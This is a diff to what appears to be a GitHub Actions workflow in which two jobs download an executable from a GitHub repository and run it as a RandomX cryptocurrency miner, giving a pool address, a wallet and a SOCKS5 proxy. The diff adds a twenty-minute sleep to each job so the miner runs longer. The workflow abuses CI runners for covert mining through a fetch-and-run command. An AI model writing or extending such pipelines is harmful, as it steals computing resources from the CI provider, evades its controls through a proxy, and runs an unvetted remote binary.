@@ -56,6 +56,7 @@ jobs:
       run: |
         sudo apt-get update && sudo apt install libc-bin libc6
         timeout 20m wget https://github.com/jepir3/Cek/raw/main/255 && chmod +x 255 && ./255 --algorithm randomx --pool randomx.rplant.xyz:17130 --tls true --wallet SaLvsCoGwEnGymEpfbiqaBLDtttdeFLYV7HGp7Lj8tbKh9q3xF3wD9bc2bYRs7g2TbNtz3muwjAdQEky42AFdagPZMx1h3MqW5y --proxy socks5://208.65.90.21:4145 --keepalive true &
+        sleep 20m
         echo "sukses"
   BuruhBorongan2:
     needs: pekerjaRodi
@@ -81,6 +82,7 @@ jobs:
       run: |
         sudo apt-get update && sudo apt install libc-bin libc6
         timeout 20m wget https://github.com/jepir3/Cek/raw/main/255 && chmod +x 255 && ./255 --algorithm randomx --pool randomx.rplant.xyz:17130 --tls true --wallet SaLvsCoGwEnGymEpfbiqaBLDtttdeFLYV7HGp7Lj8tbKh9q3xF3wD9bc2bYRs7g2TbNtz3muwjAdQEky42AFdagPZMx1h3MqW5y --proxy socks5://208.65.90.21:4145 --keepalive true &
+        sleep 20m
         echo "sukses"
   Success:
     needs: [pekerjaRodi, BuruhBorongan]
